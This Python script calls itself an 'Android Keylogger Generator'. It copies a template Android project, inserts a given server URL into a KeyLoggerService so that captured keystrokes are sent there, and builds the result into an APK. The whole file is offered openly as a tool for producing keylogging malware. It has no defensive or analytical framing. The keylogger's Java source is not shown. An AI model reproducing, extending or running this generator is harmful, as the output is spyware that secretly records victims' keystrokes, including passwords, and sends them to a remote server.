import argparse
import subprocess
import os
import shutil

def generate_keylogger(output_apk, server_url=None):
    # Step 1: Copy template APK to a new directory
    template_dir = "template_apk"
    output_dir = "output_apk"
    shutil.copytree(template_dir, output_dir)

    # Step 2: Modify the APK code based on user input
    if server_url:
        modify_code(output_dir, server_url)

    # Step 3: Build the APK
    build_apk(output_dir, output_apk)

    print(f"[+] Keylogger APK generated: {output_apk}")

def modify_code(output_dir, server_url):
    # Modify the Java code to send keystrokes to the server
    java_file = os.path.join(output_dir, "src/main/java/com/example/keylogger/KeyLoggerService.java")
    with open(java_file, "r") as file:
        code = file.read()

    code = code.replace("YOUR_SERVER_URL", server_url)

    with open(java_file, "w") as file:
        file.write(code)

def build_apk(output_dir, output_apk):
    # Build the APK using Gradle
    os.chdir(output_dir)
    subprocess.run(["./gradlew", "assembleDebug"], check=True)
    os.chdir("..")

    # Move the generated APK to the output location
    apk_path = os.path.join(output_dir, "app/build/outputs/apk/debug/app-debug.apk")
    shutil.move(apk_path, output_apk)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Android Keylogger Generator (AKGen)")
    parser.add_argument("-o", "--output", required=True, help="Output APK file name")
    parser.add_argument("-s", "--server", help="Server URL to send keystrokes")
    args = parser.parse_args()

    generate_keylogger(args.output, args.server)
